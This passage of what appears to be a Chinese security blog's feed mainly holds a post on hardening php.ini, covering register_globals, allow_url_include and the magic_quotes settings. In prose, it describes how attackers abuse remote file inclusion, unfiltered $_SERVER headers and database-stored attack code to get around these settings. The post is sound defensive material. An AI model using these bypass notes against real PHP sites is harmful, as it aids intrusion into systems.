class="line">#print ip_ADDR</span><br></pre></td></tr></table></figure><p>一个快速生成工位号 保存到csv到python脚本。<br>ps:其实一般用不着，老师让我专门给比赛写的程序，写的比较烂，将就下</p><p><img src="http://ovgfhrbzx.bkt.clouddn.com/18-3-3/90119352.jpg" alt><br>大概是这样运行的</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!--markdown--&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>php.ini 加固</title>
    <link href="https://vuln.top/2019/02/21/30/"/>
    <id>https://vuln.top/2019/02/21/30/</id>
    <published>2019-02-21T03:45:05.688Z</published>
    <updated>2019-02-21T03:45:05.698Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、register-globals"><a href="#1、register-globals" class="headerlink" title="1、register_globals"></a><!--markdown-->1、register_globals</h2><p> （全局变量注册开关）</p><p>该选项在设置为On的情况下，会直接把用户GET、POST等方式提交上来的参数<br>注册成为全局变量并初始化值为参数对应的值，使得提交参数可以直接在脚本中使用<br>register_globals在php版本小于等于4.2.3时设置为PHP_INI_ALL,从PHP5.3.0起被废弃<br>不推荐使用，在php5.4.0中移除了该选项</p><h2 id="2、allow-url-include"><a href="#2、allow-url-include" class="headerlink" title="2、allow_url_include"></a>2、allow_url_include</h2><p>（是否允许包含远程文件）</p><p>这个配置指令对PHP安全的影响不可小觑。在该配置为On的情况下，他可以直接包含远程文件<br>当存在include($var)且$var 可控的情况下，可以直接控制$var变量来执行php代码。<br>allow_url_include在php 5.2.0 后默认设置为off，配置范围是PHP_INI_ALL.与之类似的配置<br>有allow_url_fopen,配置是否允许打开远程文件，不过该参数对安全的影响没有allow_url_include大</p><h2 id="3、magic-quotes-gpc"><a href="#3、magic-quotes-gpc" class="headerlink" title="3、magic_quotes_gpc"></a>3、magic_quotes_gpc</h2><p>在安全方面做了很大的贡献，只要它被开启，在不存在编码或者其他</p><p>特殊绕过的情况下，可以使得很多漏洞无法被利用，他也是让渗透测试人员很头疼的一个东西 。在该选项设置为on时，会自动在GET、POST、COOKIE变量中的 单引号(‘) 、双引号(“)、反斜杠()及空字符(NULL)的前面加上反斜杠()但是在php5中magic_quotes_gpc并不会过滤$_SERVER变量，导致很多类似client-ip、referer一类的漏洞能够利用。在php5.3之后不推荐使用magic_quotes_gpc，所以你下载php 5.4之后的版本并打开配置文件会发现找不到这个匹配项目</p><h2 id="4、magic-quotes-runtime"><a href="#4、magic-quotes-runtime" class="headerlink" title="4、magic_quotes_runtime"></a>4、magic_quotes_runtime</h2><p>（魔术引导自动过滤）</p><p>magic_quotes_runtime 也是自动在单引号(‘)、双引号(“)、反斜杠（\）及空白字符(NULL)的前面加上反斜杠。它和magic_quotes_gpc 的区别是，处理的对象不一样，magic_quotes_runtime 只对从数据库或者文件中获取数据过滤，他的作用也非常大因为很多程序员只对外部输入的数据进行过滤，却从没有从数据库获取数据也是同样存在特殊字符的存在，所以攻击者的做法是将攻击代码写入数据库中，在程序中读取。同样在magic_quotes_runtime在php5.4之后也取消了，配置范围是PHP_INI_ALL<br>受影响的列表包括<br>有一个点要记住，只有部分函数受它的影响，所以在某些情况下这个配置是可以<br>绕过的，受影响的列表包括get_meta_tags()、file_get_contents()、file()、fgets()、fwrite()、<br>fread( )、fputcsv( )、stream_socket_recvfrom()、exec()、system()、passthru( )、stream_<br>get_contents( )、bzread( )、gzfile( )、gzgets( )、gzwrite( )、gzread( )、exif_read_data( )、<br>dba_insert( )、dba_replace( )、dba_fetch( )、ibase_fetch_row( )、ibase_fetch_assoc( )、<br>ibase_fetch_object( )、mssql_fetch_row()、mssql_fetch_object( )、mssql_fetch_array()、<br>mssql_fetch_assoc( )、mysqli_fetch_row( )、mysqli_fetch_array( )、mysqli_fetch_<br>assoc( )、mysqli_fetch_object( )、pg_fetch_row()、pg_fetch_assoc( )、pg_fetch_array( )、<br>pg_fetch_object( )、pg_fetch_all( )、pg_select( )、sybase_fetch_object( )、sybase_fetch_<br>array( )、sybase_fetch_assoc( )、SplFileObject::fgets( )、SplFileObject::fgetcsv( )、<br>SplFileObject::fwrite()。</p><h2 id="5、magic-quotes-sybase"><a href="#5、magic-quotes-sybase" class="headerlink" title="5、magic_quotes_sybase"></a>5、magic_quotes_sybase</h2><p>(魔术引号自动过滤)</p><p>magic_quotes_sybase 指令用于自动过滤特殊字符，当设置为on 时，它会覆盖掉<br>magic_quotes_gpc=on 的配置，也就是说，即使配置了gpc=on 也是没有效果的。这个指令与gpc 的共同点是处理的对象一致，即都对GET、POST、Cookie 进行处理。而它<br>们之前的区别在于处理方式不一样，magic_quotes_sybase 仅仅是转义了空字符和把<br>单引号（’）变成了双引号（’’）。与gpc 相比，这个指令使用得更少，它的配置范围是<br>PHP_INI_ALL，在 PHP 5.4.0 中移除了该选项。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1、register-globals&quot;&gt;&lt;a href=&quot;#1、register-globals&quot; class=&quot;headerlink&quot; title=&quot;1、register_globals&quot;&gt;&lt;/a&gt;&lt;!--markdown--&gt;1、register_global
      
    
    </summary>
    
    
  </entry>
  
</feed>
